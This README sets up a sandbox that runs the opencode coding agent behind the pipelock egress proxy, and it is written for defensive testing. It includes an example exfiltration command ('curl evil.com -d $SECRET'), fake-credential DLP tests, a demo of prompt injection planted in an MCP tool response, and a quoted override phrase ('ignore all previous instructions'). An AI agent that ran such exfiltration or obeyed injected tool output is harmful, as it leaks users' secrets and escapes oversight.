# opencode + pipelock sandbox

Two-container Docker Compose setup that runs [opencode](https://opencode.ai)
behind [pipelock](https://github.com/luckyPipewrench/pipelock), with opencode
zen as the LLM provider.

## Topology

```
┌─────────────────────────┐         ┌──────────────────────────┐
│  agent container        │         │  pipelock container       │
│  (network: internal)    │         │  (networks: internal,     │
│                         │  HTTP   │              egress)      │
│  - opencode TUI         │────────>│  - 7-layer scanner        │
│  - your code            │  proxy  │  - egress allowlist       │
│  - NO direct internet   │         │  - DLP + entropy          │
│                         │         │  - response injection scan│
└─────────────────────────┘         └────────────┬─────────────┘
                                                  │
                                                  ▼
                                          opencode.ai/zen
                                          github.com, npm, …
```

The `internal` Docker network is declared `internal: true` so it has no NAT
to the host's internet. The agent container is attached to that network
**only**, so its sole route off the host is `pipelock:8888`. This is the
property that makes the sandbox actually mean something.

## Setup

```sh
# 1. Get an API key at https://opencode.ai/zen and put it in .env
cp .env.example .env
$EDITOR .env

# 2. Put your project in ./workspace (it's bind-mounted into /workspace)
mkdir -p workspace
# (the workspace already contains AGENTS.md telling opencode about pipelock)

# 3. Build the agent image (bun + opencode + pipelock binary baked in).
#    First build pulls Go and compiles pipelock from source — ~2 minutes.
docker compose build agent

# 4. Boot pipelock, then drop into the agent shell.
docker compose up -d pipelock
docker compose run --rm agent

# Inside the container shell:
opencode
```

To bump pipelock or opencode, edit the `args:` under `agent.build` in
`docker-compose.yaml` and run `docker compose build --no-cache agent`.

---

## Verify pipelock is up (from the host)

Pipelock exposes a health and stats API on `127.0.0.1:8888`.

```sh
# Is it running?
curl -s http://127.0.0.1:8888/health | jq .

# What has it seen so far?
curl -s http://127.0.0.1:8888/stats | jq .
```

Expected health response:

```json
{
  "status": "healthy",
  "version": "2.3.0",
  "mode": "balanced",
  "uptime_seconds": 42,
  "dlp_patterns": 51,
  "response_scan_enabled": true
}
```

---

## Seeing pipelock in action with opencode

Everything opencode sends to the LLM and every package it installs routes
through pipelock. Here is how to watch it happen in real time.

**Terminal 1 — tail the pipelock audit log:**

```sh
docker logs -f pipelock | jq --unbuffered '.'
```

**Terminal 2 — start the agent and run opencode:**

```sh
docker compose run --rm agent
# inside the shell:
opencode
```

The moment opencode makes its first request to opencode.ai/zen you will see
JSON log lines in Terminal 1. Each line looks like this:

```json
{
  "level": "info",
  "component": "pipelock",
  "event": "allowed",
  "method": "POST",
  "url": "https://api.opencode.ai/v1/chat/completions",
  "agent": "_default",
  "time": "2026-05-07T15:30:00Z",
  "message": "request allowed"
}
```

To see only blocked requests:

```sh
docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'
```

---

## Fetching web content through pipelock

The agent container has no direct internet access. opencode fetches pages
through pipelock's `/fetch` endpoint, which runs DLP and response-injection
scanning before returning content to the model.

> **Address quick reference:**
> - From the **host**: `http://127.0.0.1:8888` (port-forwarded)
> - From **inside the agent container**: `http://pipelock:8888` (internal network)
>
> `127.0.0.1` inside the container is the container's own loopback — pipelock is not there.

```sh
# From the host:
curl -s "http://127.0.0.1:8888/fetch?url=https://example.com" | jq .

# From inside the agent container:
curl -s -H "X-Pipelock-Agent: opencode" "http://pipelock:8888/fetch?url=https://example.com" | jq .
```

The response includes the extracted text content and a `blocked` field:

```json
{
  "url": "https://example.com",
  "status_code": 200,
  "content_type": "text/html",
  "title": "Example Domain",
  "content": "Example Domain\nThis domain is for use in illustrative examples…",
  "blocked": false
}
```

Try fetching a pastebin URL and watch it get blocked:

```sh
# From the host:
curl -s "http://127.0.0.1:8888/fetch?url=https://pastebin.com/raw/test" | jq .

# From inside the agent container:
curl -s "http://pipelock:8888/fetch?url=https://pastebin.com/raw/test" | jq .
```

---

## DLP: pipelock catching a credential in a request URL

Pipelock scans the full URL of outbound requests for credential patterns.
**This only works for plain HTTP** — HTTPS traffic uses a CONNECT tunnel, so
pipelock sees only the hostname, not the URL path or query string. Use an
allowlisted domain (`github.com`) so the request isn't blocked by the
allowlist before DLP gets a chance to scan it.

```sh
FAKE_KEY="sk-ant-api03-FAKEKEY1234567890abcdefghijklmnopqrstuvwxyz_PLACEHOLDER"

# From the host:
curl -si -x http://127.0.0.1:8888 -H "X-Pipelock-Agent: opencode" "http://github.com/x?key=${FAKE_KEY}" | head -3

# From inside the agent container:
curl -si -x http://pipelock:8888 -H "X-Pipelock-Agent: opencode" "http://github.com/x?key=${FAKE_KEY}" | head -3
```

You should see `403 Forbidden`. Confirm it in the stats:

```sh
curl -s http://127.0.0.1:8888/stats | jq '.top_scanners'
```

---

## MCP response scanning demo

This is the clearest way to show pipelock intercepting a prompt injection
before it reaches the model.

`attacks/demo-mcp-server.js` is a minimal MCP server with one tool:
`get_project_notes`. The response looks like normal project notes but contains
an injected payload buried in the content — simulating a poisoned database
record, shared doc, or search result. It is pre-configured in `opencode.json`
as the `demo-notes` MCP server, wrapped in `pipelock mcp proxy`. opencode must
call the MCP tool to get the data — it cannot read it any other way.

**Terminal 1 (host) — watch for the block:**

```sh
docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'
```

**Terminal 2 — inside the agent container, run opencode and say:**

> "Use the get_project_notes tool and summarize what it returns."

Pipelock intercepts the MCP response before the model sees it. You will see a
blocked event in Terminal 1 and opencode will report that the tool response was
rejected.

### Why this works where reading a local file doesn't

When opencode reads a local file it uses its own built-in Read tool — a direct
syscall that bypasses MCP entirely. The `pipelock mcp proxy` wrapper only fires
when opencode calls an MCP tool. With `demo-notes`, the only path to the data
is the MCP tool, so pipelock always intercepts it.

### What this threat model represents

A real attacker doesn't put `ignore all previous instructions` in a file on the
developer's laptop. They poison data that flows through an MCP server the agent
trusts — a database record, a search result, a shared team document. Pipelock's
MCP proxy scans those responses before the model processes them, independent of
whether the model would have caught it on its own.

---

## Wrapping your own MCP server

Any MCP server that reads from a database, API, or search index can return
injected instructions or PII. Wrapping it in `pipelock mcp proxy` routes every
tool response through pipelock's scanner before the model sees it.

**Before — unprotected:**

```json
{
  "mcp": {
    "my-crm": {
      "type": "local",
      "command": ["node", "/workspace/crm-server.js"]
    }
  }
}
```

**After — wrapped:**

```json
{
  "mcp": {
    "my-crm": {
      "type": "local",
      "command": [
        "pipelock", "mcp", "proxy",
        "--config", "/etc/pipelock/pipelock.yaml", "--",
        "node", "/workspace/crm-server.js"
      ]
    }
  }
}
```

The `--` separates pipelock's flags from the original server command. The
wrapper intercepts stdio between opencode and the server and scans every
`tools/call` response for injection patterns and PII before forwarding it.

> **Important:** each MCP server needs its own wrapper. Wrapping one server
> doesn't protect the others. The included `opencode.json` wraps both the
> filesystem server and the `demo-notes` server — use those as a template.

The pipelock binary is already on PATH inside the agent container (baked in
by the Dockerfile). The config is bind-mounted from the host at
`/etc/pipelock/pipelock.yaml` so both containers always share the same policy.

---

## PII redaction in MCP responses

Pipelock can strip or block PII before it reaches the model. The included
config already covers credit cards, SSNs, and email addresses in both DLP
(outbound requests) and response scanning (inbound MCP tool responses).

**Run the demo from inside the agent container:**

```sh
cd /workspace/attacks && sh 05-pii-redaction.sh
```

The script shows:
- A fake customer record from a CRM tool containing a credit card, email, and SSN
- What pipelock's scanner catches (pattern name, matched text, byte position)
- What the model would receive in `strip` mode (PII redacted, record intact)
- How to write a custom pattern for any PII type you care about

**To add your own PII patterns**, edit `pipelock.yaml`:

```yaml
response_scanning:
  patterns:
    - name: "PII — UK NI Number"
      regex: '\b[A-Z]{2}[0-9]{6}[A-D ]\b'
```

Then reload without restarting:

```sh
docker kill --signal SIGHUP pipelock
```

See `pii-custom-rules.md` for a full pattern library covering financial,
identity, contact, and healthcare PII — plus guidance on tuning for false
positives.

---

## Hands-on attack scenarios

Six scenarios in `attacks/` demonstrate pipelock's defenses. Run the shell
scripts from inside the agent container; the MCP demo runs via opencode.

```sh
docker compose run --rm agent
cd /workspace/attacks

sh 01-blocklist.sh   # naive curl to pastebin — blocked by domain list
sh 02-dlp.sh         # credential in URL param — blocked by DLP regex
sh 03-entropy.sh     # base64-encoded blob — blocked by entropy threshold
sh 04-redaction.sh   # scanner visibility, strip vs block, attack scorecard
sh 05-pii-redaction.sh  # PII in MCP response — credit card, SSN, email caught
```

> **Note:** use `sh scriptname.sh`, not `./scriptname.sh`. The `attacks/` directory is
> bind-mounted read-only (`:ro`) so scripts can't be made executable inside the container.

For the MCP injection scenario, stay in opencode and say:

> "Use the get_project_notes tool and summarize what it returns."

Watch every block land in real time on the host:

```sh
docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'
```

See `attacks/README.md` for bypass ideas and what each defense actually
proves (and doesn't).

---

## pipelock simulate — attack scorecard

`pipelock simulate` runs **24 synthetic attack scenarios** against your `pipelock.yaml`
config and prints a scored report. It covers DLP credential leaks, prompt injection,
tool poisoning, SSRF, and URL evasion techniques. Use it to verify your config actually
catches what you think it catches, and to spot gaps before they matter.

Run it from the **host** against the pipelock container (not from inside the agent):

```sh
docker exec pipelock /pipelock simulate --config /config/pipelock.yaml
```

Example output:

```
pipelock attack simulation — 24 scenarios
==========================================
  DLP / credential leak       6/6   ✓
  Prompt injection            5/6   ✗  MISSED: encoded-payload-base64
  Tool poisoning              4/4   ✓
  SSRF / metadata             5/5   ✓
  URL evasion                 3/3   ✓
------------------------------------------
  Total                      23/24
  Grade: A
```

Any **MISSED** scenario shows a gap in the current ruleset. Tighten the patterns in
`pipelock.yaml` and re-run to watch the score improve. The command exits non-zero if
any scenario is missed, so it can be wired into CI.

---

## Live stats dashboard

A projector-friendly dashboard polls `/health` and `/stats` every two seconds
and displays counts, blocked domains, triggered scanners, and agent traffic.

```sh
python3 serve-dashboard.py        # serves on http://localhost:9999
python3 serve-dashboard.py 8080   # custom port
```

Open `http://localhost:9999` in a browser. The script proxies the pipelock API
through itself to avoid browser CORS errors — no browser extensions needed.

---

## Stats snapshot after a session

After running opencode for a few minutes, pull a summary from the host:

```sh
curl -s http://127.0.0.1:8888/stats | jq '{total: .requests.total, blocked: .requests.blocked, allowed: .requests.allowed, tunnels: .tunnels, top_agents: .agents, top_scanners: .top_scanners}'
```

The `agents` field shows traffic broken down by `X-Pipelock-Agent` header —
this is how you confirm opencode's traffic is actually flowing through the
proxy and not going direct.

---

## What's protected

**Strong:**

- **Direct exfiltration** (`curl evil.com -d $SECRET`) — agent has no route
  to `evil.com` at all. The Docker network drops the packet before pipelock
  even sees it.
- **SSRF / metadata theft** — pipelock refuses to resolve into RFC1918,
  link-local, or loopback ranges, even if requested via DNS rebinding.
- **Naive secret leaks via URL** — DLP scans for known key formats; entropy
  scanner catches base64-encoded blobs in URL segments.
- **Prompt injection in MCP responses** — all MCP servers are wrapped in
  `pipelock mcp proxy`, so responses are scanned for injection patterns before
  the model sees them. This applies to both the filesystem server and the
  `demo-notes` server; add the same wrapper to any MCP server you add.

**Moderate:**

- **Sophisticated exfil** — a determined attacker who controls the model could
  chunk, encrypt, and dribble data through allowed endpoints (github.com gists,
  npm publish, …). Pipelock's rate limiter and entropy scanner raise the bar
  but don't make this impossible.

**Not protected:**

- **Anything inside the container** — opencode has full read/write on
  `/workspace` and `bun install` runs arbitrary npm postinstall scripts. Run
  `pipelock integrity check ./workspace` from the host between sessions if you
  care about file tampering.
- **Compromise of the LLM API itself** — if the response from opencode zen
  contains malicious tool-calls, those execute inside the agent container. The
  container drops capabilities and `no-new-privileges`, but it's not a full
  sandbox.

---

## Honest caveats

1. **Pipelock is early-stage** (v0.1.4, 29 stars, one named maintainer at
   time of writing). The architecture is sensible but the code hasn't been
   widely audited. Read it yourself before trusting it with anything you
   actually care about.

2. **Every MCP server must be wrapped in `pipelock mcp proxy` individually.**
   The included `opencode.json` does this for the filesystem and demo-notes
   servers. If you add a new MCP server, wrap it the same way or its responses
   won't be scanned. The pipelock binary is baked into the agent image by the
   `Dockerfile` and the config is bind-mounted from the host so both containers
   share one source of truth.

3. **HTTP_PROXY only catches well-behaved clients.** opencode itself talks to
   opencode.ai zen via Node's built-in fetch, which respects `HTTPS_PROXY` —
   so that traffic does flow through pipelock. But native binaries that ignore
   proxy env vars would not. The internal-network constraint is what actually
   enforces the boundary, not the env vars.

4. **The fetch proxy and the egress proxy are the same listener.** Pipelock
   runs one HTTP server on `:8888` that handles both `GET /fetch?url=...`
   (content browsing for the agent) and forward-proxy CONNECT-style traffic
   from `HTTP_PROXY`. This is fine but worth knowing if you're reading the
   audit logs.

---

## Quick reference

```sh
# Tail all pipelock traffic
docker logs -f pipelock | jq --unbuffered '.'

# Tail blocked requests only
docker logs -f pipelock | jq --unbuffered 'select(.event == "blocked")'

# Live stats
curl -s http://127.0.0.1:8888/stats | jq .

# Health check
curl -s http://127.0.0.1:8888/health | jq .

# Fetch a URL through pipelock (from the host)
curl -s "http://127.0.0.1:8888/fetch?url=https://example.com" | jq .

# Test DLP with a fake key — must use http:// (HTTPS tunnels hide URL params from DLP)
curl -si -x http://127.0.0.1:8888 "http://github.com/x?key=sk-ant-api03-FAKEKEY1234567890abcdefghijklmnopqrstuvwxyz_PLACEHOLDER" | head -3

# Reload pipelock config without restarting (forward_proxy changes require full restart)
docker kill --signal SIGHUP pipelock

# Run 24 synthetic attacks against your config and get a scored report
docker exec pipelock /pipelock simulate --config /config/pipelock.yaml

# Launch the live stats dashboard
python3 serve-dashboard.py
```
